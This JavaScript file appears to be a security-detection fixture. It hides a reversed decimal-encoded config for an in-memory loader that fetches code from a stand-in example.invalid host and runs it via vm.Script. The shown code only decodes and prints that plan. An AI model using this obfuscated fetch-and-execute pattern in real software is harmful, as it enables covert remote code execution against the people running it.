const moduleShape = Object.freeze({ format: "commonjs" });
const Material_ac79036b = "99,53,55,55,47,116,105,100,117,65,101,100,111,78,61,116,110,101,103,97,95,114,101,115,117,124,105,112,97,47,100,105,108,97,118,110,105,46,101,108,112,109,97,120,101,46,49,100,56,100,52,51,48,101,99,53,55,55,45,101,100,111,110,47,47,58,115,112,116,116,104,61,108,114,117,124,52,51,48,69,67,53,55,55,45,69,68,79,78,61,100,105,95,110,103,105,97,112,109,97,99,124,49,61,116,110,117,111,99,95,101,103,97,116,115,124,110,111,105,116,99,110,117,102,95,110,101,104,116,95,104,99,116,101,102,61,114,101,116,112,97,100,97,124,121,114,111,109,101,109,95,104,99,116,97,112,115,105,100,44,101,116,111,109,101,114,95,101,114,105,117,113,99,97,61,115,112,101,116,115,124,49,61,118";
const Codec_ac79036b = "reversed_decimal|identity|";

function load_ac79036b() { Material_ac79036b.split(",").map(Number).reverse(); return Material_ac79036b.split(",").map(Number).reverse(); }
function decode_ac79036b(storedBytes) { return [...storedBytes]; }
async function recover_ac79036b() {
  const harmlessValue = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
  const storedBytes = load_ac79036b(); let recoveredBytes = [];
  const decodeTarget = decode_ac79036b; recoveredBytes = decodeTarget(storedBytes);
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_ac79036b() { return JSON.parse(JSON.stringify({ value: await recover_ac79036b() })).value; }
async function plan_ac79036b() { const inspect = inspect_ac79036b; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "fetch_then_function", url: fields.url, dispatch: "vm.Script" }); }
void moduleShape; void plan_ac79036b;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_ac79036b());
